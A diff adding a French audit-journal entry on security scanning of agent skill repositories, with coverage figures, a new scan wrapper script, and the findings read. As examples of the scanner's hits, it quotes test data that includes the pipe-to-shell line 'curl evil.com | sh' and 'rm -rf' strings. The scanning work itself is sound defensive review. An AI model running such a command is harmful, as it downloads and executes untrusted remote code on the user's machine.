@@ -280,6 +280,57 @@ qui se place devant les commandes shell et en réduit la sortie avant que l'agen
 **Chiffres** : 26 lignes au catalogue ; fichiers `SKILL.md` aux commits épinglés, même méthode
 (`git ls-tree`, nom exact) : 2927 + 12 = **2939**. 39 contrôles, 0 échec.
 
+## 2026-10-11 — `scripts/scan.py`, et correction de la lecture du « 0 % »
+
+**Correction des entrées du 2026-10-04 et du 2026-10-11 (ci-dessus).** Elles disent que
+Skillspector a « plafonné à 0 % de couverture » et l'interprètent comme « presque rien
+inspecté ». C'est faux. Relu dans les rapports : sur `claude-quickstarts`, 623 fichiers
+*partiellement* inspectés, aucun ignoré ; la cause est **7 fichiers** — quatre fichiers de
+verrouillage lus comme « obfusqués », deux `requirements.txt` au-delà du plafond de 5 s de
+l'analyse des dépendances, un `docker-compose.yml` au plafond de sortie — qui dégradent des
+analyseurs entiers, d'où chaque fichier compté partiel. Sur `cloudflare/computer`, l'erreur était
+la nôtre : `--recursive` ne cherche un `SKILL.md` qu'un niveau plus bas, et ce dépôt n'en a pas à
+ce niveau ; il n'a quasiment rien scanné. Seul OfficeCLI butait sur une vraie limite de taille
+(920 binaires et archives, 294 fichiers non inspectés). Les décisions de ces entrées tiennent :
+aucune ne reposait sur la couverture de Skillspector.
+
+**Ajout : `scripts/scan.py`**, bibliothèque standard seulement, sans modification de
+Skillspector. Il découpe un dépôt en une unité par dossier de skill plus une pour les
+exécutables et manifestes hors skills, écarte fichiers de verrouillage, binaires et fichiers de
+plus de 1 Mo en listant chacun, copie chaque unité sous un chemin court (limite Windows de
+260 caractères), lance `skillspector scan --no-llm` et fusionne les rapports sur les chemins du
+dépôt, triés pour la lecture. Il ne tranche rien et sort toujours en 0. Laya n'y est pas branché :
+décision de l'humain, sur le constat qu'un tri automatique ne doit jamais pouvoir écarter un
+résultat. **Un appel réseau subsiste** : l'analyse des dépendances de Skillspector envoie les noms
+et versions de paquets à `api.osv.dev` (`nodes/analyzers/osv_client.py`), même en `--no-llm` ;
+aucun contenu de fichier. Gardé, car c'est lui qui trouve les dépendances vulnérables.
+
+**Mesures :**
+- `claude-quickstarts` : 86 % inspectés entièrement (310 sur 361), contre 0 % le 2026-10-04. Pas
+  le même ensemble : le script ne remet que skills, exécutables et manifestes (361 fichiers), pas
+  la prose hors skills (623 auparavant).
+- `rtk` : 87 % (208 sur 239), 13 unités, rien d'écarté. Premier scan Skillspector de `rtk` ; il
+  n'avait pas été lancé à son ajout plus haut dans la journée.
+
+**`rtk`, lecture des résultats** : 279 HIGH, 279 MEDIUM, 5 LOW sur exécutables, 22 sur la prose
+ignorés. Les HIGH se concentrent là où l'outil analyse et réécrit des commandes
+(`src/hooks/hook_cmd.rs` 77, `src/hooks/permissions.rs` 44) et dans les tests : chaînes `rm -rf`,
+listes de variables secrètes à masquer, données de test (`hunter2`, `curl evil.com | sh`). Lu en
+particulier : **le hook ne contourne pas les permissions de Claude Code.**
+`process_claude_payload_from_decision` ne renvoie `permissionDecision: "allow"` que pour une règle
+d'autorisation que l'humain a lui-même configurée ; sinon la commande est réécrite sans décision
+et la demande de confirmation habituelle s'affiche ; une règle d'interdiction bloque la
+réécriture. Nuance : une règle `allow` pour `git status` couvre aussi `rtk git status`, qui
+l'enveloppe. Les « Supply Chain » sur `.claude/hooks/*.sh` visent des hooks de développement du
+dépôt de `rtk`, que `rtk init` n'installe pas : il installe `rtk hook claude`, le binaire lui-même.
+Aucun code malveillant.
+
+**`claude-quickstarts`, trouvé grâce aux manifestes désormais remis au scanner** : deux démos
+(`customer-support-agent`, `financial-data-analyst`) figent Next.js 14.2.5 et 14.2.15, chacun visé
+par 16 avis publiés selon OSV, dont une exécution de code à distance dans l'API d'optimisation
+d'images. Pas malveillant, mais hérité par quiconque bâtit dessus : précaution ajoutée aux deux
+README, section du `stock`.
+
 ---
 
 ## Avant de modifier ce fichier
